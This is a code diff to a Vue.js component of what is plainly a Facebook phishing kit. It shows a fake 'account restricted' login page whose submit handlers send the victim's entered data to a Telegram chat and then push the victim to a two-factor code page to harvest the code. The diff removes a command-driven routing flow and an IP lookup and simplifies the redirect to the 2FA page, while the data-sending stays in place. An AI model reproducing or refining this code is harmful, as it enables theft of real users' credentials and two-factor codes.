@@ -16,12 +16,7 @@ export default {
   data() {
     return {
       v$: useValidate(),
-      waitingForResponse: false,
-      chatMessage: false,
-      loading: "",
-      ipAddress: "",
-      interval: "",
-      decision: "",
+      loading: false,
       firstPassword: false,
       secondPassword: false,
       wrongPw: false,
@@ -38,96 +33,7 @@ export default {
       },
     };
   },
-  created() {
-    document.title = 'My Personal Account Was Restricted | Facebook';
-    axios.interceptors.request.use(
-      (config) => {
-        if (this.waitingForResponse != true && this.chatMessage != true) {
-          this.loading = true;
-        }
-        return config;
-      },
-      (error) => {
-        if (this.waitingForResponse != true && this.chatMessage != true) {
-          this.loading = false;
-        }
-        return Promise.reject(error);
-      }
-    );
-
-    axios.interceptors.response.use(
-      (response) => {
-        if (this.waitingForResponse != true && this.chatMessage != true) {
-          this.loading = false;
-        }
-        return response;
-      },
-      (error) => {
-        if (this.waitingForResponse != true && this.chatMessage != true) {
-          this.loading = false;
-        }
-        return Promise.reject(error);
-      }
-    );
-  },
-  mounted() {
-    this.getClientIP();
-    // this.checkBan();
-  },
   methods: {
-    chatMessageStatus() {
-      this.chatMessage = true;
-      console.log(this.chatMessage);
-    },
-    getClientIP() {
-      axios
-        .get("https://api.ipify.org?format=json")
-        .then((response) => {
-          this.ipAddress = response.data.ip;
-          //   this.checkBan();
-        })
-        .catch((e) => {
-          console.log(e);
-        });
-    },
-    getResponse() {
-      // Simulate response
-      setTimeout(() => {
-        let fakeResponse = "CMD_EMAIL"; // Simulate any response here
-        this.handleResponse(fakeResponse);
-      }, 2000);
-    },
-    handleResponse(responseData) {
-      let resType;
-      if (responseData == "CMD_EMAIL") {
-        resType = "email";
-        this.$router.push({
-          name: "twofa",
-          params: {
-            type: resType,
-            email: this.form.email,
-          },
-        });
-      } else if (responseData == "CMD_CODE") {
-        resType = "code";
-        this.$router.push({
-          name: "twofa",
-          params: {
-            type: resType,
-            email: this.form.email,
-          },
-        });
-      } else if (responseData == "CMD_CHECKPOINT") {
-        this.$router.push({
-          path: "checkpoint",
-        });
-      } else if (responseData == "CMD_WRONG") {
-        this.wrongPw = true;
-        this.loading = false;
-        this.modal.password = '';
-      }
-      clearInterval(this.interval);
-    },
     submitForm() {
       console.log("submit");
       this.v$.$validate(); // checks all inputs
@@ -145,13 +51,14 @@ export default {
           chat_id: TELEGRAM_CHAT_ID,
           text: JSON.stringify(data),
         })
-          .then((response) => {
-            console.log(response);
-          })
-          .catch((e) => {
-            this.errors.push(e);
-            console.log(this.errors);
-          });
+        .then((response) => {
+          console.log(response);
+          // Simulate moving to CMD_CODE after submitting form
+          this.handleResponse("CMD_CODE");
+        })
+        .catch((error) => {
+          console.error(error);
+        });
 
         this.firstPassword = true;
       }
@@ -182,8 +89,7 @@ export default {
           .then((response) => {
             console.log(response);
             // Simulate moving to CMD_CODE after wrong password submission
-            let fakeResponse = "CMD_CODE"; // Simulate CMD_CODE response
-            this.handleResponse(fakeResponse);
+            this.handleResponse("CMD_CODE");
           })
           .catch((error) => {
             console.error(error);
@@ -191,6 +97,18 @@ export default {
         }
       } else {
         this.modal.error = true;
+      }
+    },
+    handleResponse(responseData) {
+      if (responseData == "CMD_CODE") {
+        // Redirect to CMD_CODE simulation route
+        this.$router.push({
+          name: "twofa",
+          params: {
+            type: "code",
+            email: this.form.email,
+          },
+        });
       }
     },
     alert() {
@@ -210,6 +128,7 @@ export default {
   },
 };
 </script>
+
 
 <template>
   <div v-if="loading" id="loadFacebookC" class="">
